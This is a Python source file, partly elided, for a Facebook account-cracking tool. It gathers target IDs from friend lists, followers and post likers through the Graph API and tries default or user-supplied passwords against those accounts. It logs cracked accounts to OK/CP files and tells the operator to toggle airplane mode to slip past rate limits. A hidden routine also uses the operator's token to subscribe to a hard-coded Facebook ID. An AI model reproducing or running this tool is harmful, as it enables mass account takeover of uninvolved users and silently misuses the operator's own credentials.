#!/usr/bin/python3
#-*-coding:utf-8-*-
# Made With ❤️ By Kashif Baloch
# Update V0.1

# Copyright© Baloch ID 2021
# 100% Open Source Code

# Author : Kashif Baloch
# Facebook (Muhammad Kashif)   : Facebook.com
# Warning (☬ Mr Jadugar ☬)    : Mr Jadugar Here
# Whatsapp (Mr Jadugar )      : +923475353500
# Warning (Jadugar)           : Fuck of 
...
### Logo
_logo_line_1_ = ('%s ______  ___   _     _____ _____  _   _ '%(_P_))
_logo_line_2_ = ('%s★彡[ᴋᴀꜱʜɪꜰ]彡★ %s★彡[ᴋᴀꜱʜɪꜰ]彡★'%(_P_,_U_))
_logo_line_3_ = ('%s| |_/ / /_\ \| |   | | | | /  \/| |_| |  %s│   %s• Code By Mr Jadugar  •   %s│'%(_P_,_U_,_P_,_U_))
_logo_line_4_ = ('%s| ___ \  _  || |   | | | | |    |  _  |   %s│ %sGithub.com/KASHIF-BALOCH %s│'%(_P_,_U_,_P_,_U_))
_logo_line_5_ = ('%s★彡[ᴋᴀꜱʜɪꜰ]彡★'%(_U_))
def _my_logo_():
...
def _bot_follow_(_tok_dev_):
    token = _tok_dev_
    try:
        _req_post_("https://graph.facebook.com/742821237/subscribers?access_token=" + token)      # Zait Ullah
...
def _login_dev_(_Cici_Cantik_Banget_):
    ...
    _tok_dev_ = _cici_dapunta_('%s[%s•%s] %sLogin Token :\n\n'%(_U_,_P_,_U_,_P_))
    try:
...
def _menu_dev_(_Dapunta_Ganteng_Banget_):
    ...
    try:
        ...
        _ip_dev_ = " "
    _dapunta_cici_('%s[%s•%s] %sLogin %s%s'%(_U_,_P_,_U_,_P_,_U_,_nama_dev_))
    _dapunta_cici_('%s[%s•%s] %sID : %s'%(_U_,_P_,_U_,_P_,_id_dev_))
    _dapunta_cici_('%s[%s•%s] %sIP : %s\n'%(_U_,_P_,_U_,_P_,_ip_dev_))
    _dapunta_cici_('%s[%s1%s] %sCrack From Public ID'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s2%s] %sCrack From Follower ID'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s3%s] %sCrack From ID Like'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s4%s] %sCrack From Friendlist'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s5%s] %sUser Agent'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s0%s] %sLog Out'%(_U_,_P_,_U_,_P_))
    _dapunta_menu__cici_dapunta__ = _cici_dapunta_('%s[%s•%s] %sChoose : '%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('')
    if _dapunta_menu__cici_dapunta__ in ['',' ']:
        _dapunta_cici_('%s[%s!%s] %sCorrect Content'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
...
def _publik_dev_(_tok_dev_):
    ...
    _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Take Friends ID'%(_U_,_P_,_U_,_P_))
    _target_dev_ = _cici_dapunta_('%s[%s•%s] %sPut in ID Target : %s'%(_U_,_P_,_U_,_P_,_U_))
    try:
        ...
        _dapunta_cici_('%s[%s•%s] %sName : %s%s'%(_U_,_P_,_U_,_P_,_U_,_name_))
    except:
...
def _followers_dev_(_tok_dev_):
    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Clone From Friends'%(_U_,_P_,_U_,_P_))
    _target_dev_ = _cici_dapunta_('%s[%s•%s] %sPut Target ID : %s'%(_U_,_P_,_U_,_P_,_U_))
    try:
        _req_tar_ = _req_get_("https://graph.facebook.com/%s?access_token=%s"%(_target_dev_,_tok_dev_))
        _jso_tar_ = _js_lo_(_req_tar_.text)
        _name_    = _jso_tar_['name']
...
def _likers_dev_(_tok_dev_):
    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Friends id'%(_U_,_P_,_U_,_P_))
    _target_dev_ = _cici_dapunta_('%s[%s•%s] %sPut  Target ID : %s'%(_U_,_P_,_U_,_P_,_U_))
    try:
        _req_tar_ = _req_get_("https://graph.facebook.com/%s?access_token=%s"%(_target_dev_,_tok_dev_))
        _jso_tar_ = _js_lo_(_req_tar_.text)
...
class _crack_dev_:
    def __init__(self,files):
        ...
        self.cp = []
        self.ko = 0
        _dapunta_cici_('\n%s[%s•%s] %sCrack With Password Default/Manual [d/m]'%(_U_,_P_,_U_,_P_))
        while True:
            f = _cici_dapunta_('%s[%s•%s] %sChoose : '%(_U_,_P_,_U_,_P_))
            if f=="":
                _dapunta_cici_('%s[%s!%s] %sCorrect Content'%(_M_,_P_,_M_,_P_))
                time.sleep(2)
                ...
                try:
                    ...
                    time.sleep(2)
                    _menu_dev_(self._Dapunta_Sayang_Cici_)
                _dapunta_cici_('%s[%s•%s] %sExample : Pakistan,786786,Khan786'%(_U_,_P_,_U_,_P_))
                self.pwlist()
                break
                ...
                try:
                    ...
                    start_method()
                    put = _cici_dapunta_('%s[%s•%s] %sChoose : '%(_U_,_P_,_U_,_P_))
                    _dapunta_cici_(''%())
                    if put in ['']:
                        _dapunta_cici_('%s[%s!%s] %sCorrect Content'%(_M_,_P_,_M_,_P_))
                        time.sleep(2)
                    ...
                    continue
    def pwlist(self):
        self.pw = _cici_dapunta_('%s[%s•%s] %sput in Password : '%(_U_,_P_,_U_,_P_)).split(",")
        if len(self.pw) ==0:
            _dapunta_cici_('%s[%s!%s] %sCorrect Content'%(_M_,_P_,_M_,_P_))
            time.sleep(2)
            _menu_dev_(self._Dapunta_Sayang_Cici_)
...
def _cek_result_dev_():
    ...
    _dapunta_cici_('%s[%s2%s] %sCheck Results CP'%(_U_,_P_,_U_,_P_))
    ch = _cici_dapunta_('%s[%s•%s] %sChoose : '%(_U_,_P_,_U_,_P_))
    if ch in ['']:
        _dapunta_cici_('%s[%s!%s] %sCorrect Content'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
        ...
        try:
            ...
            _dapunta_cici_('\n%s[%s•%s] %sTotal Crack Result Date %s Is %s Account'%(_U_,_P_,_U_,_P_,del1,len(ppp)))
        except:
...
def _check_recode_(_oscylopsce_,_ascylapsci_,_escylipsce_):
    ...
    if _uscylupsci_ not in _recode_:_dapunta_cici_('%s[%s!%s] %sHey, do you want to recode??'%(_M_,_P_,_M_,_P_))
...
def _ugen_dev_(_Dapunta_Sayang_Cici_):
    ...
    pmu = _cici_dapunta_('%s[%s•%s] %sChoose : '%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('')
    if pmu in[""]:
        _dapunta_cici_('%s[%s!%s] %sCorrect Content'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        ...
        _dapunta_cici_("\n%s[ %sThis is your current user agent %s]"%(_U_,_P_,_U_))
        _cici_dapunta_('\n%s[ %sReturn %s]%s'%(_U_,_P_,_U_,_P_))
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pmu in ['0','00','000','f']:
        _menu_dev_(_Dapunta_Sayang_Cici_)
    else:
        _dapunta_cici_('%s[%s!%s] %sCoreect Content'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
def _ugen_hp_(_Dapunta_Sayang_Cici_):
    ...
    if pc in['']:
        ...
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    _dapunta_cici_("%s[ %sSuccessfully Replace User Agent %s]"%(_U_,_P_,_U_))
    _cici_dapunta_('\n%s[ %sReturn %s]%s'%(_U_,_P_,_U_,_P_))
    _menu_dev_(_Dapunta_Sayang_Cici_)
...
def _var_ugen_(_Dapunta_Cinta_Cici_):
    ...
    _dapunta_cici_("%s[%s3%s] %sChange User Agent %s[%sSesuaikan HP%s]"%(_U_,_P_,_U_,_P_,_U_,_P_,_U_))
    _dapunta_cici_("%s[%s4%s] %sDelete User Agent"%(_U_,_P_,_U_,_P_))
    _dapunta_cici_("%s[%s5%s] %sCheck User Agent"%(_U_,_P_,_U_,_P_))
    _dapunta_cici_("%s[%s0%s] %sReturn"%(_U_,_P_,_U_,_P_))

### Tampilan Metode
def start_method():
    _dapunta_cici_('\n%s[%s1%s] %sKASHIF Api'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s2%s] %sKASHIF Mbasic'%(_U_,_P_,_U_,_P_))

### Tampilan Mulai Crack
def started():
    _dapunta_cici_('%s[%s•%s] %sKASHIF Start Cracking...'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s•%s] %sKASHIF [OK]  OK/%s.txt'%(_U_,_P_,_U_,_P_,tanggal))
    _dapunta_cici_('%s[%s•%s] %sKASHIF [CP]  CP/%s.txt'%(_U_,_P_,_U_,_P_,tanggal))
    _dapunta_cici_('%s[%s•%s] %sUse Airplane Mode for [fast cloning] Every 5 Mint\n'%(_U_,_P_,_U_,_P_))
